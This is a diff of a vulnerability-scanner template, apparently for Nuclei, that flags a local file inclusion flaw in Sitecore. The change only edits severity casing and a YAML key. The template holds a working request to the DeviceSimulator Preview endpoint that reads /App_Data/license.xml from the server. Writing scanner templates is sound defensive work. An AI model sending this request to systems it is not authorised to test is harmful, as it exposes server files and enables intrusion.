@@ -3,11 +3,11 @@ id: Sitecore
 info:
   name: SiteCode-LFI
   author: excis3
-  severity: High
+  severity: high
   description: Sitecode LFI
   tags: LFI
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/api/sitecore/Sitecore.Mvc.DeviceSimulator.Controllers.SimulatorController,Sitecore.Mvc.DeviceSimulator.dll/Preview?previewPath=/App_Data/license.xml"
